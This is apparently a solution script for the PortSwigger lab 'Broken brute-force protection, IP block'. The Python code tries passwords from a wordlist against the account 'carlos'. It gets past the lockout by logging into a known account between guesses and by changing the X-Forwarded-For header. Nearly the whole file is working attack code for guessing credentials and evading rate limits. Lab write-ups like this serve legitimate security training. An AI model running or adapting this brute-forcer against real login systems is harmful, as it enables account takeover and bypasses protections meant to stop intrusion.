# PortSwigger
# Lab: Broken brute-force protection, IP block

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target Data
url = ""
session = ""

# Localhost Proxies (To intercept with Burp Suite)
proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }

# Request Cookies
cookies = {
    "session": session
}

# Information provided by the lab
my_user_name = 'wiener'
my_password = 'peter'
user_name = 'carlos'

def read_file(path):
    file = open(path, "r")
    list_lines = file.readlines()
    file.close()
    return list_lines

def send_request(playload, forwarded_count):    
    headers={'X-Forwarded-For': str(forwarded_count)}  
    response = requests.post(url, data=playload, headers=headers, cookies=cookies, verify=False, proxies=proxies)    
    
    if 'Please try again in 1 minute' in response.text:
        print('\r(!) Number of attempts exceeded')
        exit()

    return len(response.history) >= 1 and response.history[0].status_code == 302 

def main():
    password = ''
    restart_attempts = 0
    forwarded_count = 100
    list_passwords = read_file('.\Authentication/passwords.txt')

    print("\r(+) Forcing password...")

    while len(list_passwords) != 0:
        forwarded_count += 1

        if  restart_attempts == 0:
            restart_attempts = 2
            playload = f"username={my_user_name}&password={my_password}"
            send_request(playload, forwarded_count)
        else:
            restart_attempts -= 1
            pwd = list_passwords[0].strip()
            sys.stdout.write("\r%s" % pwd)
            sys.stdout.flush()

            playload = f"username={user_name}&password={pwd}"
            if send_request(playload, forwarded_count) == True:
                list_passwords.clear()
                password = pwd
            else:
                del list_passwords[0]

            sys.stdout.write("\r%s" % (" " * len(pwd)))
            sys.stdout.flush()


    print('\r(+) The password is %s' % password)


if __name__ == "__main__":
    main()